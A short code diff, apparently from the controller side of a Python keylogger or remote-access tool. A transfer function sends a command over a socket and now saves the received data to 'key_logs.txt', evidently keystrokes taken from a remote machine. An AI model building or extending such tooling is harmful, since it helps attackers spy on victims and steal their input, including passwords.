@@ -49,7 +49,7 @@ def getKeys(conn, command, addr):
     
 def transfer(conn,command):
     conn.send(command)
-    f = open('test.txt','wb')
+    f = open('key_logs.txt','wb')
     while True:  
         bits = conn.recv(1024)
         if bits.endswith(b'DONE'):
